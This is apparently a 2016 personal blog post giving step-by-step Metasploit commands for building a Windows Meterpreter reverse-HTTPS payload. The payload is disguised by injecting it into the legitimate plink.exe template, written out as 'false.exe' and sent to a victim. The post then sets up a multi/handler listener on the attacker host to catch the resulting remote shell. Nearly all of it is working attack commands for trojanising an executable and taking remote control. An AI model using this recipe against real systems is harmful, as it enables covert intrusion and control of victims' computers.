---
layout: post
title: "Metasploit Generates Payload"
date: 2016-02-26 16:47:27 -0500
comments: true
categories: metasploit payload
---

###This note is for generating payload using Metasploit.

###Use `generate` command:

```
msf > use payload/windows/meterpreter/reverse_https

msf payload(reverse_https) > set lhost 192.168.79.156

msf payload(reverse_https) > set lport 4444

msf payload(reverse_https) > generate -t exe -f false.exe -x /var/www/html/plink.exe

```
<!--more-->

Here I use reverse_https to generate payload and inject to plink.exe as a template.

options:

`-t  ------ payload format`

`-f  ------ payload output`

`-x  ------ injection template`

This step will generate reverse https payload and use plink.exe as a template, write to file false.exe and send it to the target.

In order to get the reverse https shell, I have to set up multi handler:

###Set up `multi handler`

```
msf > use exploit/multi/handler 

msf exploit(handler) > set payload windows/meterpreter/reverse_https

msf exploit(handler) > set lhost 192.168.79.156

msf exploit(handler) > set lport 4444

msf exploit(handler) > exploit 
```

Once the victim run the false.exe on the target machine, it will initlize a reverse https connection to the attacker.

{% img  /images/blog/metasplot_payload/metasploit_payload_1.JPG  [title text [alt text]] %}
